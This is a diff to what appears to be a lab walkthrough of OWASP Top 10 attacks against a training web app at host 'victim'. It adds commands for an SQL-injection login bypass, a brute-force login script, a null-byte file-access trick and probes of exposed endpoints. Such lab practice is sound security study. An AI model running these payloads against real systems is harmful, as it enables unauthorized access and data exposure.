@@ -78,3 +78,21 @@ curl -X POST victim:3000/rest/user/login \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
 ```
+
+### A04:2021 Insecure Design
+
+```bash
+cd /opt
+source venv/bin/activate
+python3 brute_login.py
+```
+
+### A05:2021 Security Misconfiguration
+
+```bash
+curl victim:3000/ftp/legal.md%2500.md
+curl victim:3000/ftp/
+curl victim:3000/metrics
+curl victim:3000/api/SecurityQuestions | jq
+curl victim:3000/score-board
+```
